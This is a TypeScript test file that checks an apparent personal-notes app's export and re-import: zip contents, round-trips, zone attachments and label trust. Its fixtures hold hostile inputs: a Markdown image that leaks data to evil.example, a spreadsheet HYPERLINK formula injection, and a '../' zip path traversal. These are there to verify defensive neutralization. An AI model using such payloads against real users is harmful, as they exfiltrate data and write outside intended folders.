import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { ensureSystemTypes } from "@boni/agent";
import { label } from "@boni/entities";
import { openUserStore, type UserStore } from "@boni/store";
import { importVault } from "@boni/vault-import";
import { afterEach, describe, expect, it } from "vitest";
import { exportFiles, exportZip } from "./export.ts";
import { ExportFormatError, importExport } from "./reimport.ts";
import { readZip, writeZip, ZipError } from "./zip.ts";

/** An invented vault (never real notes): people, projects with relations, movements, a calendar. */
const FILES: Record<string, string> = {
  "registros/personas/ana-ejemplo.md": "---\ntype: person\ntags: [ucam, profesor]\n---\n# Ana\n",
  "registros/personas/luis-ejemplo.md": "---\ntype: person\ntags: [amigo]\n---\n",
  "registros/finanzas/movimientos/2026/10/2026-10-19-cafe.md":
    '---\ntype: movement\ndate: "2026-10-19"\namount: -1.6\ncurrency: EUR\npeople: ["[[ana-ejemplo]]", "[[luis-ejemplo]]"]\n---\n',
  "proyectos/curso-ejemplo.md":
    '---\ntype: project\nstatus: activo\nparent: "[[programa-ejemplo]]"\n---\nNotas.\n',
  "proyectos/programa-ejemplo.md": "---\ntype: project\nstatus: activo\n---\n",
};
const NOW = Date.UTC(2026, 9, 20, 12);
const cleanups: (() => void)[] = [];
afterEach(() => {
  for (const c of cleanups.splice(0)) c();
});
function store(): UserStore {
  const s = openUserStore(":memory:", { now: () => NOW });
  ensureSystemTypes(s);
  cleanups.push(() => s.close());
  return s;
}
function filled(): UserStore {
  const root = mkdtempSync(join(tmpdir(), "boni-export-"));
  cleanups.push(() => rmSync(root, { recursive: true, force: true }));
  for (const [p, text] of Object.entries(FILES)) {
    mkdirSync(dirname(join(root, p)), { recursive: true });
    writeFileSync(join(root, p), text);
  }
  const s = store();
  importVault(root, s, { apply: true, run: "import-1", now: NOW });
  const mail = label("external", "personal", [{ kind: "mail", id: "m1" }], true);
  const own = label("user", "personal", [{ kind: "turn", id: "t" }]);
  const ana = s.list("t_persona").find((x) => x.entity.values.f_title === "ana-ejemplo");
  s.update(
    ana?.entity.id as string,
    {
      $body: { value: "De un correo: ![x](https://evil.example/p.png?d=secreto)", label: mail },
      f_type: { value: '=HYPERLINK("https://evil.example")', label: mail },
    },
    { actor: "agent", run: "r1" },
  );
  const gone = s.create(
    "t_persona",
    { f_title: { value: "Borrada", label: own } },
    { actor: "user" },
  );
  s.remove(gone.entity.id, { actor: "user" });
  return s;
}
const text = (files: Map<string, Buffer>, p: string) => files.get(p)?.toString("utf8") ?? "";

describe("the export", () => {
  it("is a zip any program opens, with every format", () => {
    const zip = exportZip(filled(), { now: NOW, log: true, views: { charts: [] } });
    const files = readZip(zip);
    expect([...files.keys()].filter((p) => !p.endsWith(".md") || p === "README.md")).toEqual([
      "README.md",
      "csv/movimiento.csv",
      "csv/persona.csv",
      "csv/proyecto.csv",
      "json/extension.ndjson",
      "json/job.ndjson",
      "json/memory.ndjson",
      "json/movimiento.ndjson",
      "json/page.ndjson",
      "json/persona.ndjson",
      "json/proyecto.ndjson",
      "log.ndjson",
      "schema.json",
      "views.json",
    ]);
    expect(files.has("persona/ana-ejemplo.md")).toBe(true);
    expect(text(files, "README.md")).toContain("Persona (`persona`): 2");
    // The system's own unzip agrees.
    const dir = mkdtempSync(join(tmpdir(), "boni-zip-"));
    cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
    writeFileSync(join(dir, "x.zip"), zip);
    let tested = "";
    try {
      tested = execFileSync("unzip", ["-t", join(dir, "x.zip")], { encoding: "utf8" });
    } catch (e) {
      if ((e as { code?: string }).code !== "ENOENT") throw e;
      tested = "No errors detected (no unzip here)";
    }
    expect(tested).toContain("No errors detected");
  });

  it("leaves the trash out; Markdown is neutralized and CSV never holds a formula", () => {
    const files = readZip(exportZip(filled(), { now: NOW }));
    expect(text(files, "json/persona.ndjson")).not.toContain("Borrada");
    const md = text(files, "persona/ana-ejemplo.md");
    expect(md).toContain("De un correo: x (https:⁄⁄evil.example/p.png?d=secreto)");
    expect(md).toContain('boni_integrity: "external"');
    expect(text(files, "json/persona.ndjson")).toContain(
      "![x](https://evil.example/p.png?d=secreto)",
    );
    const csv = text(files, "csv/persona.csv");
    expect(csv.startsWith("﻿id,")).toBe(true);
    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example"")"`);
    expect(csv).toContain("amigo");
    const move = text(files, "csv/movimiento.csv");
    expect(move).toContain("ana-ejemplo; luis-ejemplo");
    expect(move).toContain(",-1.6,");
    // Links between notes point to the exported notes.
    expect(text(files, "proyecto/curso-ejemplo.md")).toContain('"[[programa-ejemplo]]"');
    const schema = JSON.parse(text(files, "schema.json"));
    expect(schema.jsonSchema.movimiento.properties.values.properties.amount).toMatchObject({
      type: "number",
    });
  });
});

describe("the export comes back", () => {
  it("re-imported (an export of one's own), it exports again identical", () => {
    const a = filled();
    const first = exportFiles(a, { now: NOW });
    const b = store();
    const files = new Map(first.map((e) => [e.path, e.data]));
    const dry = importExport(files, b);
    expect(dry).toMatchObject({ applied: false, created: 5, existing: [], failed: [] });
    expect(b.list("t_persona")).toHaveLength(0);
    a.setAiAccess("t_persona", "opaque", "portatil");
    const withChoice = new Map(exportFiles(a, { now: NOW }).map((e) => [e.path, e.data]));
    const r = importExport(withChoice, b, { apply: true, trustLabels: true });
    expect(b.aiAccess()).toEqual({ t_persona: "opaque" });
    expect(r).toMatchObject({ applied: true, created: 5, failed: [] });
    const first2 = exportFiles(a, { now: NOW });
    const second = exportFiles(b, { now: NOW });
    const strip = (p: string, d: Buffer) =>
      p.endsWith(".ndjson")
        ? d
            .toString("utf8")
            .split("\n")
            .filter(Boolean)
            .map((l) => {
              const { version: _v, ...rest } = JSON.parse(l);
              return JSON.stringify(rest);
            })
            .join("\n")
        : d.toString("utf8");
    expect(second.map((e) => e.path)).toEqual(first2.map((e) => e.path));
    for (const [i, e] of second.entries())
      expect(strip(e.path, e.data), e.path).toBe(strip(e.path, first2[i]?.data as Buffer));
    // Again: nothing twice.
    expect(importExport(files, b, { apply: true }).existing).toHaveLength(5);
  });

  it("carries a zone's attachments and keeps the zone when re-imported", () => {
    const zone = mkdtempSync(join(tmpdir(), "boni-zone-"));
    cleanups.push(() => rmSync(zone, { recursive: true, force: true }));
    mkdirSync(join(zone, "Documentos"));
    writeFileSync(join(zone, "Documentos/poliza.pdf"), "%PDF-1.7 inventado");
    const a = store();
    importVault(zone, a, { apply: true, zone: "private", now: NOW });
    const sha = String(a.list("t_private_documentos")[0]?.entity.values.f_boni_file);
    const files = new Map(exportFiles(a, { now: NOW }).map((e) => [e.path, e.data]));
    expect(text(files, `files/${sha}`)).toBe("%PDF-1.7 inventado");
    expect(JSON.parse(text(files, "schema.json")).zones).toEqual({
      t_private_documentos: "private",
    });
    const b = store();
    importExport(files, b, { apply: true });
    expect(b.zones()).toEqual({ t_private_documentos: "private" });
    expect(b.aiAccess()).toEqual({ t_private_documentos: "hidden" });
    expect(Buffer.from(b.getFile(sha)?.data ?? []).toString()).toBe("%PDF-1.7 inventado");
    expect(b.getFile(sha)?.mime).toBe("application/pdf");
  });

  it("by default the file's labels are only claims: at most imported, from the export", () => {
    const files = new Map(exportFiles(filled(), { now: NOW }).map((e) => [e.path, e.data]));
    const b = store();
    importExport(files, b, { apply: true, name: "copia.zip" });
    const ana = b.list("t_persona").find((x) => x.entity.values.f_title === "ana-ejemplo");
    expect(ana?.labels.f_tags?.integrity).toBe("imported");
    expect(ana?.labels.$body?.integrity).toBe("external");
    expect(ana?.labels.f_tags?.sources).toContainEqual({ kind: "export", id: "copia.zip" });
    // A label edited in the file to say "user" is still only imported.
    const edited = new Map(files);
    const line = text(files, "json/persona.ndjson").replaceAll(
      '"integrity":"imported"',
      '"integrity":"user"',
    );
    edited.set("json/persona.ndjson", Buffer.from(line));
    const c = store();
    importExport(edited, c, { apply: true });
    for (const s of c.list("t_persona"))
      for (const l of Object.values(s.labels)) expect(l.integrity).not.toBe("user");
  });

  it("refuses what is not an export, and a zip that would write outside or is damaged", () => {
    expect(() => importExport(new Map([["x.txt", Buffer.from("x")]]), store())).toThrow(
      ExportFormatError,
    );
    expect(() => readZip(writeZip([{ path: "../fuera.txt", data: Buffer.from("x") }]))).toThrow(
      ZipError,
    );
    const zip = writeZip([{ path: "a.txt", data: Buffer.from("hola hola hola") }]);
    zip[40] = (zip[40] as number) ^ 0xff; // inside the packed data
    expect(() => readZip(zip)).toThrow();
  });
});
